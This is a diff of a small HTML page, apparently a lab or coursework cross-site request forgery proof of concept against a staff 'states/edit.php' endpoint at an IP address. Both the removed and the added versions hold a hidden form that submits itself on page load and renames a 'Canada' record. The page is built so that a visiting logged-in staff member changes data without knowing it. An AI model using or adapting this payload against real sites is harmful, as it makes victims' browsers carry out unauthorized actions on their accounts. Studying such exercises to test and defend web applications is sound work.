@@ -1,20 +1,9 @@
 <html>
-  <head>
-    <title>Fake Form</title>
-  </head>
-     <body onload="document.good_form.submit()">
-      <h3> Form to edit Canada to CanadaElaaaaaa </h3>
-      <form action="https://35.184.88.145/red/public/staff/states/edit.php?..." name ="good_form" method="POST" style="display: none;" target="hidden_results" >
-      Name:<br />
-      <input type="hidden" name="name" value="CanadaElaaaaaa" /><br />
-      Code:<br />
-      <input type="hidden" name="code" value="Can" /><br />
-      Country ID:<br />
-      <input type="hidden" name="country_id" value="2" /><br />
-      <br />
-      <input type="submit" " value="Update"  />
-      </form>
-      <iframe name="hidden_results" style="display: none;"></iframe>
-     </body>
-  
+  <body onload="document.update_Canada.submit()">
+  <form action="https://104.198.222.114/red/public/staff/states/edit.php?id=2" method="post" name="update_Canada" style="display: none;">    
+    <input type="text" name="name" value="Canadaaaa" />
+    <input type="text" name="code" value="CA" />
+    <input type="text" name="country_id" value="2" />
+  </form>
+  </body>
 </html>
